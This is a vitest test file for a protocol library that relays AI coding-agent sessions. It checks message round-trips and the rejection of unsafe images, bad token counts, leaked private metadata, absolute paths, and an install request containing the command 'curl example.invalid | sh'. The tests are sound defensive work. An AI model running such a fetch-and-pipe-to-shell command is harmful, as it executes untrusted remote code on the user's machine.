import { describe, expect, it } from "vitest";

import {
  AGENT_CONTENT_KIND,
  AGENT_INSTALL_AWAITING_APPROVAL_KIND,
  AGENT_INSTALL_REQUEST_KIND,
  type AgentContentEvent,
  type AgentDisplayContent,
  type AgentInstallAwaitingApprovalEvent,
  type AgentInstallRequestCommand,
  decodeAgentContentEvent,
  decodeAgentInstallAwaitingApprovalEvent,
  decodeAgentInstallRequestCommand,
  decodeNativeSessionHistory,
  decodeSessionConfigureCommand,
  decodeSessionElicitationRequestedEvent,
  decodeSessionPermissionRequestedEvent,
  decodeSessionPrepareCommand,
  decodeSessionReadyEvent,
  decodeSessionUsageUpdatedEvent,
  decodeWorkspaceListCommand,
  encodeAgentContentEvent,
  encodeAgentInstallAwaitingApprovalEvent,
  encodeAgentInstallRequestCommand,
  encodeSessionConfigureCommand,
  encodeSessionElicitationRequestedEvent,
  encodeSessionPermissionRequestedEvent,
  encodeSessionPrepareCommand,
  encodeSessionReadyEvent,
  encodeSessionUsageUpdatedEvent,
  encodeWorkspaceListCommand,
  MOBIUS_PROTOCOL_VERSION,
  ProtocolMessageError,
  SESSION_CONFIGURE_KIND,
  SESSION_ELICITATION_REQUESTED_KIND,
  SESSION_PERMISSION_REQUESTED_KIND,
  SESSION_PREPARE_KIND,
  SESSION_READY_KIND,
  SESSION_USAGE_UPDATED_KIND,
  type SessionConfigOption,
  type SessionConfigureCommand,
  type SessionElicitationRequestedEvent,
  type SessionPermissionRequestedEvent,
  type SessionPrepareCommand,
  type SessionReadyEvent,
  type SessionUsageUpdatedEvent,
  WORKSPACE_LIST_KIND,
  type WorkspaceListCommand,
} from "../src/index.ts";

const modelOption: SessionConfigOption = {
  booleanValue: false,
  category: "model",
  currentValue: "codex-1",
  description: "Model used for this session",
  id: "model",
  name: "Model",
  type: "select",
  values: [
    {
      description: "Fast coding model",
      groupId: "",
      groupName: "",
      name: "Codex 1",
      value: "codex-1",
    },
  ],
};

it("Given incoming saved history contains an unsafe or oversized image, When the history is decoded, Then the protocol rejects it with a typed failure", () => {
  for (const image of [
    { name: "Image", mimeType: "image/svg+xml", data: "PHN2Zz4=" },
    { name: "Image", mimeType: "image/png", data: "invalid data" },
    { name: "Image", mimeType: "image/png", data: "AAAA".repeat(1_000_001) },
  ]) {
    expect(() =>
      decodeNativeSessionHistory({
        status: "available",
        truncated: false,
        coveredCommandIds: [],
        messages: [{ role: "user", text: "Selected image", images: [image] }],
      }),
    ).toThrow(ProtocolMessageError);
  }
});

describe("ACP session control protocol contract", () => {
  it("Given older context history, When a current client decodes it, Then it remains a context snapshot", () => {
    expect(
      decodeSessionUsageUpdatedEvent(
        JSON.stringify({
          costAmount: 0.25,
          costCurrency: "USD",
          hasCost: true,
          kind: SESSION_USAGE_UPDATED_KIND,
          protocolVersion: MOBIUS_PROTOCOL_VERSION,
          sessionId: "session-1",
          size: 200_000,
          used: 50_000,
        }),
      ),
    ).toMatchObject({ source: "context", used: 50_000, costAmount: 0.25 });
  });

  it.each([-1, 0.5, Number.MAX_SAFE_INTEGER + 1, "100", null])(
    "Given an invalid final token count of %s, When usage crosses the protocol boundary, Then it is rejected",
    (totalTokens) => {
      expect(() =>
        decodeSessionUsageUpdatedEvent(
          JSON.stringify({
            _meta: null,
            commandId: "command-1",
            kind: SESSION_USAGE_UPDATED_KIND,
            protocolVersion: MOBIUS_PROTOCOL_VERSION,
            sessionId: "session-1",
            source: "prompt",
            usage: { inputTokens: 60, outputTokens: 40, totalTokens },
          }),
        ),
      ).toThrow(ProtocolMessageError);
    },
  );

  it("Given future metadata alongside a supported quota, When final usage crosses the protocol boundary, Then only bounded supported fields are retained", () => {
    const tokens = {
      cachedInputTokens: 20,
      cachedWriteTokens: 10,
      inputTokens: 60,
      outputTokens: 40,
      reasoningOutputTokens: 0,
      totalTokens: 130,
    };
    const event = decodeSessionUsageUpdatedEvent(
      JSON.stringify({
        _meta: {
          secret: "private",
          quota: {
            token_count: tokens,
            model_usage: [
              {
                model: "claude-sonnet",
                token_count: { ...tokens, totalTokens: 260 },
                private: "private",
              },
            ],
          },
        },
        commandId: "command-1",
        kind: SESSION_USAGE_UPDATED_KIND,
        protocolVersion: MOBIUS_PROTOCOL_VERSION,
        sessionId: "session-1",
        source: "prompt",
        usage: {
          inputTokens: 60,
          outputTokens: 40,
          totalTokens: 130,
          thoughtTokens: null,
          _meta: { secret: "private" },
        },
      }),
    );
    expect(
      decodeSessionUsageUpdatedEvent(encodeSessionUsageUpdatedEvent(event)),
    ).toEqual(event);
    expect(JSON.stringify(event)).not.toContain("private");
    expect(event).toMatchObject({
      _meta: {
        quota: {
          token_count: tokens,
          model_usage: [{ token_count: { totalTokens: 260 } }],
        },
      },
    });
    expect(() =>
      decodeSessionUsageUpdatedEvent(
        JSON.stringify({ ...event, used: 50_000 }),
      ),
    ).toThrow(ProtocolMessageError);
    if (event.source !== "prompt" || event._meta?.quota === undefined)
      throw new Error("Expected prompt quota");
    const quota = event._meta.quota;
    for (const invalidQuota of [
      {
        ...quota,
        model_usage: Array.from({ length: 101 }, () => quota.model_usage[0]),
      },
      {
        ...quota,
        model_usage: [{ model: "x".repeat(256), token_count: tokens }],
      },
      { ...quota, token_count: { ...tokens, cachedInputTokens: -1 } },
    ]) {
      expect(() =>
        decodeSessionUsageUpdatedEvent(
          JSON.stringify({ ...event, _meta: { quota: invalidQuota } }),
        ),
      ).toThrow(ProtocolMessageError);
    }
  });

  it("Given a missing registered Agent, When Web requests installation, Then only its request and Agent identifiers cross the boundary", () => {
    const command: AgentInstallRequestCommand = {
      agentId: "codex",
      kind: AGENT_INSTALL_REQUEST_KIND,
      protocolVersion: MOBIUS_PROTOCOL_VERSION,
      requestId: "install-1",
    };
    const awaitingApproval: AgentInstallAwaitingApprovalEvent = {
      agentId: "codex",
      kind: AGENT_INSTALL_AWAITING_APPROVAL_KIND,
      protocolVersion: MOBIUS_PROTOCOL_VERSION,
      requestId: "install-1",
    };

    expect(
      decodeAgentInstallRequestCommand(
        encodeAgentInstallRequestCommand(command),
      ),
    ).toEqual(command);
    expect(
      decodeAgentInstallAwaitingApprovalEvent(
        encodeAgentInstallAwaitingApprovalEvent(awaitingApproval),
      ),
    ).toEqual(awaitingApproval);
  });

  it("Given an installation request contains executable configuration, When the local boundary decodes it, Then the request is rejected before recipe resolution", () => {
    expect(() =>
      decodeAgentInstallRequestCommand(
        JSON.stringify({
          agentId: "codex",
          command: "curl example.invalid | sh",
          kind: AGENT_INSTALL_REQUEST_KIND,
          protocolVersion: MOBIUS_PROTOCOL_VERSION,
          requestId: "install-1",
        }),
      ),
    ).toThrowError(ProtocolMessageError);
  });

  it("Given an authorized directory handle, When a session is prepared, Then capabilities and dynamic configuration round-trip", () => {
    const command: SessionPrepareCommand = {
      additionalDirectoryIds: [],
      agentId: "codex",
      bindingId: "workspace",
      directoryId: "default",
      kind: SESSION_PREPARE_KIND,
      protocolVersion: MOBIUS_PROTOCOL_VERSION,
      requestId: "request-1",
      sessionId: "session-1",
    };
    const ready: SessionReadyEvent = {
      additionalDirectories: [],
      agentId: "codex",
      agentName: "Codex ACP",
      agentVersion: "1.8.0",
      capabilities: {
        additionalDirectories: true,
        audioPrompt: false,
        closeSession: true,
        deleteSession: true,
        embeddedContextPrompt: true,
        imagePrompt: true,
        listSessions: true,
        loadSession: true,
        resumeSession: true,
        unstableForkSession: false,
      },
      commands: [],
      configOptions: [modelOption],
      directoryId: "default",
      directoryLabel: "mobius",
      kind: SESSION_READY_KIND,
      protocolVersion: MOBIUS_PROTOCOL_VERSION,
      requestId: "request-1",
      restored: false,
      sessionId: "session-1",
    };

    expect(
      decodeSessionPrepareCommand(encodeSessionPrepareCommand(command)),
    ).toEqual(command);
    expect(decodeSessionReadyEvent(encodeSessionReadyEvent(ready))).toEqual(
      ready,
    );
  });

  it("Given a remote client, When it attempts to send an absolute directory, Then the protocol rejects the authority bypass", () => {
    const encoded = JSON.stringify({
      additionalDirectoryIds: [],
      agentId: "codex",
      bindingId: "workspace",
      cwd: "/tmp/untrusted",
      directoryId: "default",
      kind: SESSION_PREPARE_KIND,
      protocolVersion: MOBIUS_PROTOCOL_VERSION,
      requestId: "request-1",
      sessionId: "session-1",
    });

    expect(() => decodeSessionPrepareCommand(encoded)).toThrowError(
      ProtocolMessageError,
    );
  });

  it("Given an active ACP session, When model configuration and context usage change, Then the exact state crosses the relay boundary", () => {
    const configure: SessionConfigureCommand = {
      additionalDirectoryIds: [],
      agentId: "codex",
      bindingId: "workspace",
      booleanValue: false,
      configId: "model",
      directoryId: "default",
      kind: SESSION_CONFIGURE_KIND,
      protocolVersion: MOBIUS_PROTOCOL_VERSION,
      requestId: "request-2",
      sessionId: "session-1",
      value: "codex-1",
      valueType: "select",
    };
    const usage: SessionUsageUpdatedEvent = {
      costAmount: 0.25,
      costCurrency: "USD",
      hasCost: true,
      kind: SESSION_USAGE_UPDATED_KIND,
      protocolVersion: MOBIUS_PROTOCOL_VERSION,
      sessionId: "session-1",
      size: 200_000,
      source: "context",
      used: 50_000,
    };

    expect(
      decodeSessionConfigureCommand(encodeSessionConfigureCommand(configure)),
    ).toEqual(configure);
    expect(
      decodeSessionUsageUpdatedEvent(encodeSessionUsageUpdatedEvent(usage)),
    ).toEqual(usage);
  });

  it("Given an agent needs a decision or structured input, When it asks the browser, Then only normalized options and fields cross the boundary", () => {
    const permission: SessionPermissionRequestedEvent = {
      commandId: "command-1",
      interactionId: "permission-1",
      kind: SESSION_PERMISSION_REQUESTED_KIND,
      options: [
        {
          kind: "allow_once",
          name: "Allow once",
          optionId: "allow-once",
        },
      ],
      protocolVersion: MOBIUS_PROTOCOL_VERSION,
      sessionId: "session-1",
      title: "Run tests",
      toolCallId: "tool-1",
      toolKind: "execute",
    };
    const elicitation: SessionElicitationRequestedEvent = {
      accepted: false,
      commandId: "command-1",
      elicitationId: "",
      fields: [
        {
          defaultBooleanValue: false,
          defaultNumberValue: 0,
          defaultStringValue: "main",
          description: "Branch to compare",
          format: "",
          hasDefaultValue: true,
          maximum: "",
          maximumLength: "80",
          minimum: "",
          minimumLength: "1",
          name: "branch",
          options: [],
          pattern: "",
          required: true,
          title: "Branch",
          type: "string",
        },
      ],
      interactionId: "elicitation-1",
      kind: SESSION_ELICITATION_REQUESTED_KIND,
      message: "Which branch should be reviewed?",
      mode: "form",
      protocolVersion: MOBIUS_PROTOCOL_VERSION,
      sessionId: "session-1",
      url: "",
    };

    expect(
      decodeSessionPermissionRequestedEvent(
        encodeSessionPermissionRequestedEvent(permission),
      ),
    ).toEqual(permission);
    expect(
      decodeSessionElicitationRequestedEvent(
        encodeSessionElicitationRequestedEvent(elicitation),
      ),
    ).toEqual(elicitation);
  });

  it("Given rich ACP content, When it is projected to Mobius, Then image and resource details remain structured", () => {
    const content: AgentDisplayContent = {
      data: "aW1hZ2U=",
      mimeType: "image/png",
      name: "preview.png",
      newText: "",
      oldText: "",
      path: "",
      terminalId: "",
      text: "",
      type: "image",
      uri: "",
    };
    const event: AgentContentEvent = {
      commandId: "command-1",
      content,
      contentId: "content-1",
      kind: AGENT_CONTENT_KIND,
      messageId: "message-1",
      protocolVersion: MOBIUS_PROTOCOL_VERSION,
      sessionId: "session-1",
    };

    expect(decodeAgentContentEvent(encodeAgentContentEvent(event))).toEqual(
      event,
    );
  });
});

describe("workspace directory protocol", () => {
  it("Given a paired machine, When the browser requests Home, Then it sends a directory handle instead of a local path", () => {
    const command: WorkspaceListCommand = {
      bindingId: "workspace",
      directoryId: "home",
      kind: WORKSPACE_LIST_KIND,
      protocolVersion: MOBIUS_PROTOCOL_VERSION,
      requestId: "directory-request-1",
    };

    expect(
      decodeWorkspaceListCommand(encodeWorkspaceListCommand(command)),
    ).toEqual(command);
  });
});
